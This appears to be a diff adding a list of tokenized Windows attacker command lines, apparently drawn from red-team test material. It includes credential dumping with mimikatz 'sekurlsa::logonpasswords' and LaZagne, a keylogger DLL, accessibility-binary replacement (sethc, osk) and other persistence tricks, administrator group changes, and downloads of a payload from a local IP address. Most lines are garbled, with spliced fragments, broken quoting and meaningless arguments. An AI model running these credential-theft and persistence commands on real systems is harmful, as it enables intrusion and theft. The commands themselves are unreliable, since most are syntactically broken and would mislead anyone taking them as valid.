@@ -1,0 +1,64 @@
+nmap -o $ { ip
+ffuf /add
+python make_image.py $ { source_file } -l $ filterargs
+net localgroup `` administrators '' /v `` cor_profiler '' /f
+/y $ delete = administrators } ''
+net localgroup administrators '' /f
+psexec.exe \\ $ domain = `` consumer ; -t $ hklm\software\microsoft\windows volumn test }
+nmap -o $ executionpolicy /f
+cmdkey /list
+nmap -o $ { windir t1547.009 you 1000 = administrators } -o
+reg add `` hklm\software\microsoft\windows hklm\software\microsoft\windows nt\currentversion\windows '' cor_profiler '' '' disable , threadingmodel ''
+gpresult /z
+reg query
+copy powershell admins `` # : \programdata\microsoft\windows\start /resume '' \windows\system32\sethc.exe in ''
+for : \windows\system32\at.exe $ target volumn name you copy \system32\osk.exe
+net localgroup administrators '' /f
+namp -sn -l '' /o '' '' '' -name cor_profiler '' c cor_profiler ''
+net localgroup administrators `` administrators '' '' /f
+cmdkey /list
+$ shortcut = `` set-wmiinstance , administrators '' administrators '' -name cor_profiler ''
+net localgroup `` administrators '' '' /f
+sekurlsa : :logonpasswords -t $ '' service account command
+bitsadmin.exe /create = $ `` cor_profiler_path '' ;
+copy `` hkey_local_machine\system\currentcontrolset\services\w32time\timeproviders\atomictest '' '' ''
+ffuf -w $ consumerargs
+ren $ { user_name } in $ '' domain
+lazagne.exe windows
+add-content $ `` filterargs bookmarks
+net localgroup `` administrators '' /t /f /grant administrators '' '' file administrators
+nbtstat -n
+rundll32.exe c : \windows\system32\at.exe $ hklm\software\microsoft\windows t1547.009 -l ; -l $ hkey_local_machine\software\microsoft\windows '' t1547.009 /nowrap administrators
+get-item } -o file '' file ''
+net localgroup administrators `` cor_profiler '' ''
+.\lazagne.exe all
+rundll32 popcalc.dll , keylog
+get-localgroupmember query
+remove-item -path $ { filename_regex }
+copy /y $ { filename_regex }
+reg `` hklm\system\currentcontrolset\control\session add `` cor_profiler '' '' enabled driver '' '' '' threadingmodel
+get-ciminstance -classname win32_processor ) \\ $ ( `` http : //192.168.1.29:9000/payload/redirect.sdb -o ;
+sekurlsa : :logonpasswords
+net localgroup administrators '' /f
+enable-localuser -name `` cor_profiler '' /f
+fsutil.exe trace decode
+$ shortcut = `` keylog
+net localgroup administrators '' /f
+quser
+net localgroup `` cor_profiler administrators ''
+adfind.exe as \\ { http : -list http : //192.168.1.29:9000/payload/redirect.sdb -o .\redirect.sdb
+$ filtertoconsumerbinding = `` \users\ = `` $ { target '' domain or /user '' file '' ; -t in administrators '' '' /user administrators $ { user_name } in $ ( ;
+net group `` domain -p $ { user_name } in = '' ; ;
+net localgroup `` administrators '' '' /v cor_profiler ''
+copy domain admins $ { filename_regex }
+ipconfig
+lazagne.exe windows
+-u $ target '' t1547.009 software\classes\clsid\ wscriptshell.createshortcut atomictest ''
+reg query
+reg add `` hklm\system\currentcontrolset\control\print\monitors\atomicredteam c : nt\currentversion\silentprocessexit\svchost.exe '' /v cor_profiler '' ''
+dig $ { path admins = `` $ { output_zip_name } in $ { target volumn name name cor_profiler = administrators '' -name $ { registry_path
+% localappdata % \microsoft\teams\current\teams.exe
+net localgroup `` administrators '' /t /v executionpolicy /f
+remove-item -path `` `` http : //192.168.1.29:9000/payload/redirect.sdb -o foreach-object } -o .\redirect.sdb
+net localgroup `` administrators '' '' '' /d `` cor_profiler '' ''
+nbtstat -n
